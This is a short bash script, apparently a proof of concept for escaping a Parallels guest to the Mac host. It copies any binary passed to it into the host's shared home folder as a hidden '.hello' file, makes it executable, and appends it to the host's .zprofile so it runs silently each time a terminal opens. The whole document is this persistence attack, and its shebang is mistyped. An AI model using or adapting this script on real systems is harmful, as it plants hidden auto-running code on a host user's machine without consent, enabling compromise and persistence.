#/bin/bash
# ./home.sh <binary>
cp $1 /media/psf/Home/.hello
chmod +x /media/psf/Home/.hello
echo "~/.hello" >> /media/psf/Home/.zprofile
echo Done, launch the terminal on Mac
